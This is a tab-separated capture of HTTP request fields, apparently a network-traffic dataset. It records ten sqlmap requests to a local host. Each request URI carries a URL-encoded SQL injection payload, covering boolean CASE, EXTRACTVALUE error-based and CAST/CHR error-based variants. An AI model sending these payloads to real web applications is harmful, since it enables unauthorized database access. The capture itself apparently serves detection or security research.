http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/%28SELECT%20%28CASE%20WHEN%20%282301%3D9296%29%20THEN%20%27web%27%20ELSE%20%28SELECT%209296%20UNION%20SELECT%204642%29%20END%29%29		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/%28SELECT%20%28CASE%20WHEN%20%282301%3D9296%29%20THEN%20%27web%27%20ELSE%20%28SELECT%209296%20UNION%20SELECT%204642%29%20END%29%29
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/%28SELECT%20%28CASE%20WHEN%20%282507%3D2507%29%20THEN%20%27web%27%20ELSE%20%28SELECT%207576%20UNION%20SELECT%204809%29%20END%29%29		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/%28SELECT%20%28CASE%20WHEN%20%282507%3D2507%29%20THEN%20%27web%27%20ELSE%20%28SELECT%207576%20UNION%20SELECT%204809%29%20END%29%29
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%29%20AND%20EXTRACTVALUE%282720%2CCONCAT%280x5c%2C0x717a787171%2C%28SELECT%20%28ELT%282720%3D2720%2C1%29%29%29%2C0x717a626a71%29%29%20AND%20%286919%3D6919		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%29%20AND%20EXTRACTVALUE%282720%2CCONCAT%280x5c%2C0x717a787171%2C%28SELECT%20%28ELT%282720%3D2720%2C1%29%29%29%2C0x717a626a71%29%29%20AND%20%286919%3D6919
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%20AND%20EXTRACTVALUE%282720%2CCONCAT%280x5c%2C0x717a787171%2C%28SELECT%20%28ELT%282720%3D2720%2C1%29%29%29%2C0x717a626a71%29%29		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%20AND%20EXTRACTVALUE%282720%2CCONCAT%280x5c%2C0x717a787171%2C%28SELECT%20%28ELT%282720%3D2720%2C1%29%29%29%2C0x717a626a71%29%29
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%29%20AND%20EXTRACTVALUE%282720%2CCONCAT%280x5c%2C0x717a787171%2C%28SELECT%20%28ELT%282720%3D2720%2C1%29%29%29%2C0x717a626a71%29%29%20AND%20%28%27UEWU%27%3D%27UEWU		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%29%20AND%20EXTRACTVALUE%282720%2CCONCAT%280x5c%2C0x717a787171%2C%28SELECT%20%28ELT%282720%3D2720%2C1%29%29%29%2C0x717a626a71%29%29%20AND%20%28%27UEWU%27%3D%27UEWU
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%20AND%20EXTRACTVALUE%282720%2CCONCAT%280x5c%2C0x717a787171%2C%28SELECT%20%28ELT%282720%3D2720%2C1%29%29%29%2C0x717a626a71%29%29%20AND%20%27ZBiC%27%3D%27ZBiC		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%20AND%20EXTRACTVALUE%282720%2CCONCAT%280x5c%2C0x717a787171%2C%28SELECT%20%28ELT%282720%3D2720%2C1%29%29%29%2C0x717a626a71%29%29%20AND%20%27ZBiC%27%3D%27ZBiC
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%20AND%20EXTRACTVALUE%282720%2CCONCAT%280x5c%2C0x717a787171%2C%28SELECT%20%28ELT%282720%3D2720%2C1%29%29%29%2C0x717a626a71%29%29--%20ZNQJ		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%20AND%20EXTRACTVALUE%282720%2CCONCAT%280x5c%2C0x717a787171%2C%28SELECT%20%28ELT%282720%3D2720%2C1%29%29%29%2C0x717a626a71%29%29--%20ZNQJ
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%29%20AND%204277%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284277%3D4277%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%282854%3D2854		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%29%20AND%204277%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284277%3D4277%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%282854%3D2854
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%20AND%204277%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284277%3D4277%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%20AND%204277%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284277%3D4277%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29
*/*	gzip,deflate										no-cache						close										192.168.1.104															1	http://192.168.1.104/web%27%29%20AND%204277%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284277%3D4277%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27cIyp%27%3D%27cIyp		GET				HTTP/1.1																			sqlmap/1.5.11#stable (https://sqlmap.org)				/web%27%29%20AND%204277%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284277%3D4277%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27cIyp%27%3D%27cIyp
